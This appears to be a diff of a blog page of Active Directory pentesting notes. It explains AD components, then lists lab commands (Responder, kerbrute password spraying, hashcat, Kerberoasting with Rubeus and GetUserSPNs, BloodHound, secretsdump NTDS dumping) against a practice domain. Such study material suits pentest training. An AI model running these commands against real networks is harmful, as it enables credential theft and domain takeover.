@@ -16,13 +16,13 @@
 <meta property="og:site_name" content="HackThe4O4">
 <meta property="og:description" content="Active Directory在內網滲透中，當攻擊者取得內網某台機器的控制權後，會以被攻陷的主機為跳板，透過收集域內憑證等各種方法，存取域內其他機器，進一步擴大資產範圍。透過此類手段，攻擊者最終可能獲得網域控制器的存取權限，甚至完全控制基於Windows作業系統的整個內部網路環境，控制網域環境下的全部機器。 目錄服務 (例如 Active Directory Domain Services (A">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://no-flag.com/img/AD_Untitled.png">
-<meta property="og:image" content="https://no-flag.com/img/AD_Untitled_1.png">
+<meta property="og:image" content="https://no-flag.com/2024/12/21/ActiveDirectory/img/AD_Untitled.png">
+<meta property="og:image" content="https://no-flag.com/2024/12/21/ActiveDirectory/img/AD_Untitled_1.png">
 <meta property="article:published_time" content="2024-12-21T12:32:07.069Z">
 <meta property="article:modified_time" content="2024-03-04T16:57:57.786Z">
 <meta property="article:author" content="Noflag">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://no-flag.com/img/AD_Untitled.png">
+<meta name="twitter:image" content="https://no-flag.com/2024/12/21/ActiveDirectory/img/AD_Untitled.png">
   
     <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
   
@@ -168,33 +168,27 @@
 <p>目錄服務 (例如 Active Directory Domain Services (AD DS)) 提供儲存目錄資料的方法，並使這些資料可供網路使用者與系統管理員使用。 例如，AD DS 會儲存使用者帳戶的相關資訊，例如名稱、密碼、電話號碼等，並讓相同網路上的其他授權使用者存取這項資訊。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/nirajkharel/AD-Pentesting-Notes">https://github.com/nirajkharel/AD-Pentesting-Notes</a></p>
 <ul>
-<li><p>Directory service developed by Microsoft to manage Windows domain networks</p>
-</li>
-<li><p>Stores information related to objects,such as Computers,Users,Printers,etc.</p>
-<ul>
+<li>Directory service developed by Microsoft to manage Windows domain networks</li>
+<li>Stores information related to objects,such as Computers,Users,Printers,etc.<ul>
 <li>Think about it as a phone book for Windows</li>
 </ul>
 </li>
-<li><p>Authenticates using Kerberos tickets.</p>
-<ul>
+<li>Authenticates using Kerberos tickets.<ul>
 <li>Non-Windows devices,such as Linux machines,firewalls,etc.can also authenticate to Active Directory via RADIUS or LDAP</li>
 </ul>
 </li>
-<li><p>All the directory is a identity management service</p>
-</li>
+<li>All the directory is a identity management service</li>
 <li><p>only for windows machines</p>
 </li>
 <li><p>Active Directory is the most commonly used identity management service in the world</p>
 <ul>
-<li>95%of Fortune 1000 companies implement the service in their networks (<a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/Enterprise-">https://techcommunity.microsoft.com/t5/Enterprise-</a>Mobility-Security&#x2F;Success-with-Enterprise-Mobility-ldentity&#x2F;ba-p&#x2F;248613)</li>
+<li>95%of Fortune 1000 companies implement the service in their networks (<a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/Enterprise-">https://techcommunity.microsoft.com/t5/Enterprise-</a>Mobility-Security/Success-with-Enterprise-Mobility-ldentity/ba-p/248613)</li>
 </ul>
 </li>
-<li><p>Can be exploited without ever attacking patchable exploits.  Instead,we abuse features,trusts,components,and more.</p>
-</li>
+<li>Can be exploited without ever attacking patchable exploits.  Instead,we abuse features,trusts,components,and more.</li>
 </ul>
 <h2 id="Active-Directory-Components"><a href="#Active-Directory-Components" class="headerlink" title="Active Directory Components"></a>Active Directory Components</h2><ul>
-<li><p>physical components</p>
-<ul>
+<li>physical components<ul>
 <li>Data store</li>
 <li>Domain controllers<ul>
 <li>A domain controller is a server with the AD DS server role installed that has specifically been promoted to a domain controller<ul>
@@ -225,14 +219,10 @@
 </li>
 <li><p>logical components</p>
 <ul>
-<li><p>Partitions</p>
-</li>
-<li><p>Schema</p>
-</li>
-<li><p>Domains</p>
-</li>
-<li><p>域用於對組織中的物件進行分組和管理。物件可以是印表機、群組等。</p>
-<ul>
+<li>Partitions</li>
+<li>Schema</li>
+<li>Domains</li>
+<li>域用於對組織中的物件進行分組和管理。物件可以是印表機、群組等。<ul>
 <li>Domains are <strong>used to group and manage objects</strong> in an organization<ul>
 <li>user、computer、printer…</li>
 </ul>
@@ -240,14 +230,13 @@
 <li>An administrative boundary for applying policies to groups of objects</li>
 <li>A replication boundary for replicating data between domain controllers</li>
 <li>An authentication and authorization boundary that provides a way to limit the scope of access to resources</li>
-<li>XX.com, XXX.tw, <a target="_blank" rel="noopener" href="http://xxx.org/">XXX.org</a> …</li>
+<li>XX.com, XXX.tw, <a target="_blank" rel="noopener" href="http://XXX.org">XXX.org</a> …</li>
 </ul>
 </li>
-<li><p>Domain trees</p>
-<ul>
+<li>Domain trees<ul>
 <li>A domain tree is a hierarchy of domains in AD DS<ul>
 <li>parent domain - children domain -  children domain</li>
-<li><a target="_blank" rel="noopener" href="http://contonso.com/">contonso.com</a> - <a target="_blank" rel="noopener" href="http://emea.contoso.com/">emea.contoso.com</a> - na.contoso.com</li>
+<li><a target="_blank" rel="noopener" href="http://contonso.com">contonso.com</a> - <a target="_blank" rel="noopener" href="http://emea.contoso.com">emea.contoso.com</a> - na.contoso.com</li>
 <li>Share a contiquous namespace with the parent domain</li>
 <li>Can have additional child domains</li>
 <li>By default create a two-way transitive trust with other domains</li>
@@ -255,8 +244,7 @@
 </li>
 </ul>
 </li>
-<li><p>Forests</p>
-<ul>
+<li>Forests<ul>
 <li>A forest is a collection of</li>
 <li>bunch of trees &gt; forest</li>
 <li>one or more domain trees</li>
@@ -269,11 +257,9 @@
 <li>elevate to an enterprise admin - be able to cross forest with that account</li>
 </ul>
 </li>
-<li><p>Sites</p>
-</li>
-<li><p>Organization units (OUs)</p>
-<ul>
-<li>OUs are <strong>Active Directory containers</strong> that can contain users,groups,computers,and<br>  other OUs</li>
+<li>Sites</li>
+<li>Organization units (OUs)<ul>
+<li>OUs are <strong>Active Directory containers</strong> that can contain users,groups,computers,and<br>other OUs</li>
 <li>Represent your organization hierarchically and logically</li>
 <li>Manage a collection of objects in a consistent way</li>
 <li>Delegate permissions to administer groups of objects</li>
@@ -283,43 +269,28 @@
 <li><p>Trusts</p>
 <ul>
 <li><p>Trusts provide a mechanism for users to gain access to resources in another domain</p>
-<p>  <img src="/img/AD_Untitled.png" alt="Untitled"></p>
+<p>  <img src="img/AD_Untitled.png" alt="Untitled"></p>
 </li>
 <li><p>All domains in a forest trust all other domains in the forest</p>
 </li>
-<li><p>Trusts can extend outside the forest</p>
-</li>
+<li>Trusts can extend outside the forest</li>
 </ul>
 </li>
 <li><p>Defines every type of object that can be stored in the directory</p>
 </li>
-<li><p>Enforces rules regarding object creation and configuration</p>
-</li>
+<li>Enforces rules regarding object creation and configuration</li>
 <li><p>Like rule book 、 buleprint</p>
+<p>| Object Types | Function | Examples |<br>| —- | —- | —- |<br>| Class Object | What objects can be created in the directory</p>
 </li>
 </ul>
-<table>
-<thead>
-<tr>
-<th>Object Types</th>
-<th>Function</th>
-<th>Examples</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Class Object</td>
-<td>What objects can be created in the directory</td>
-<td></td>
-</tr>
-</tbody></table>
 <ul>
 <li>user、computer、printer… | + User</li>
-<li>Computer |<br>  | Attribute Object | Information that can be attached to an object | + Display name |</li>
+<li>Computer |<br>| Attribute Object | Information that can be attached to an object | + Display name |</li>
 </ul>
 </li>
-<li><p>Objects</p>
-</li>
+<li>Objects</li>
 </ul>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -327,7 +298,8 @@
 <th>Description</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>User</td>
 <td>Enables network resource access for a user</td>
 </tr>
@@ -355,8 +327,11 @@
 <td>Shared folders</td>
 <td>Enables users to search for shared folders based on properties</td>
 </tr>
-</tbody></table>
-<p><img src="/img/AD_Untitled_1.png" alt="Untitled"></p>
+</tbody>
+</table>
+</div>
+<p><img src="img/AD_Untitled_1.png" alt="Untitled"></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -364,7 +339,8 @@
 <th>Description</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>sudo responder -I ens224 -A</td>
 <td>Start Responder in analysis mode</td>
 </tr>
@@ -373,19 +349,19 @@
 <td>Start network traffic response spoofing with Responder to gather NTLMv2 password hashes</td>
 </tr>
 <tr>
-<td>kerbrute userenum -d INLANEFREIGHT.LOCAL –dc 172.16.5.5 jsmith.txt -o kerb-results</td>
+<td>kerbrute userenum -d INLANEFREIGHT.LOCAL —dc 172.16.5.5 jsmith.txt -o kerb-results</td>
 <td>Enumerate valid Active Directory users for password spraying</td>
 </tr>
 <tr>
-<td>hashcat -m 5600 bsmith_ntlmv2 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</td>
+<td>hashcat -m 5600 bsmith_ntlmv2 /usr/share/wordlists/rockyou.txt</td>
 <td>Attempt to crack an NTLMv2 password hash gathered with Responder using Hashcat</td>
 </tr>
 <tr>
-<td>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 –pass-pol</td>
+<td>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 —pass-pol</td>
 <td>Enumerate the domain password policy using CrackMapExec</td>
 </tr>
 <tr>
-<td>crackmapexec smb 10.129.203.121 -u ‘’ -p ‘’ –users –export $(pwd)&#x2F;users.txt</td>
+<td>crackmapexec smb 10.129.203.121 -u ‘’ -p ‘’ —users —export $(pwd)/users.txt</td>
 <td>Check for SMB NULL sessions on a domain controller host and enumerate valid users</td>
 </tr>
 <tr>
@@ -393,7 +369,7 @@
 <td>Leverage an SMB NULL session on a domain controller host to verify the domain password policy</td>
 </tr>
 <tr>
-<td>kerbrute passwordspray -d inlanefreight.local –dc 172.16.5.5 valid_users.txt Welcome1</td>
+<td>kerbrute passwordspray -d inlanefreight.local —dc 172.16.5.5 valid_users.txt Welcome1</td>
 <td>Perform a password spraying attack using the Kerbrute tool</td>
 </tr>
 <tr>
@@ -403,13 +379,15 @@
 <tr>
 <td>Get-ADUser -Filter *</td>
 <td>select Name</td>
+<td>List all domain users using the Active Directory PowerShell module Get-ADUser cmdlet and filter by the username</td>
 </tr>
 <tr>
 <td>Get-DomainUser *</td>
 <td>Select-Object samaccountname,description</td>
+<td>Check the description field of all domain users for sensitive data such as passwords</td>
 </tr>
 <tr>
-<td>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL&#x2F;mholliday</td>
+<td>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</td>
 <td>Kerberoast from a Linux attack host</td>
 </tr>
 <tr>
@@ -417,7 +395,7 @@
 <td>Run the BloodHound Python version from a Linux attack host to map out the domain</td>
 </tr>
 <tr>
-<td>SharpHound.exe -c all –zipfilename inlanefreight_bloodhound</td>
+<td>SharpHound.exe -c all —zipfilename inlanefreight_bloodhound</td>
 <td>Run the SharpHound C# ingestor from a Windows attack host to map out the domain</td>
 </tr>
 <tr>
@@ -425,18 +403,20 @@
 <td>Run the SharpHound PowerShell ingestor from a Windows attack host to map out the domain</td>
 </tr>
 <tr>
-<td>Rubeus.exe kerberoast &#x2F;ldapfilter:’admincount&#x3D;1’ &#x2F;nowrap</td>
+<td>Rubeus.exe kerberoast /ldapfilter:’admincount=1’ /nowrap</td>
 <td>Kerberoast admin accounts using the Rubeus tool from a Windows attack host</td>
 </tr>
 <tr>
-<td>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT&#x2F;<a href="mailto:&#x61;&#100;&#117;&#110;&#110;&#64;&#49;&#x37;&#x32;&#46;&#x31;&#54;&#x2e;&#53;&#x2e;&#53;">&#x61;&#100;&#117;&#110;&#110;&#64;&#49;&#x37;&#x32;&#46;&#x31;&#54;&#x2e;&#53;&#x2e;&#53;</a> -use-vss</td>
+<td>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</td>
 <td>Dump the NTDS Active Directory database to retrieve NTLM password hashes for all domain users for offline cracking</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide">https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a></p>
-<p><a target="_blank" rel="noopener" href="https://medium.com/@awabrajpoot88/active-directory-inital-attack-vectors-2-8479bed79411">https:&#x2F;&#x2F;medium.com&#x2F;@awabrajpoot88&#x2F;active-directory-inital-attack-vectors-2-8479bed79411</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/@awabrajpoot88/active-directory-inital-attack-vectors-2-8479bed79411">https://medium.com/@awabrajpoot88/active-directory-inital-attack-vectors-2-8479bed79411</a></p>
 
       
     </div>
@@ -530,5 +510,21 @@ MathJax.Hub.Queue(function() {
 
 
   </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
 </body>
 </html>
